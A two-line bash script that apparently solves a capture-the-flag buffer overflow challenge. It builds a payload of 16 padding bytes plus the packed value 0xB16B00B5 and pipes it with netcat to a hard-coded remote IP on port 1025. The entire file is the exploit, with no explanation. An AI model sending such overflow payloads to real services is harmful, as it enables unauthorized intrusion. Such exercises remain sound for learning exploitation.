#!/bin/bash
python -c "import struct;out = 'A'*0x10;out += struct.pack('I', 0xB16B00B5);print(out)" | nc 34.75.105.136 1025
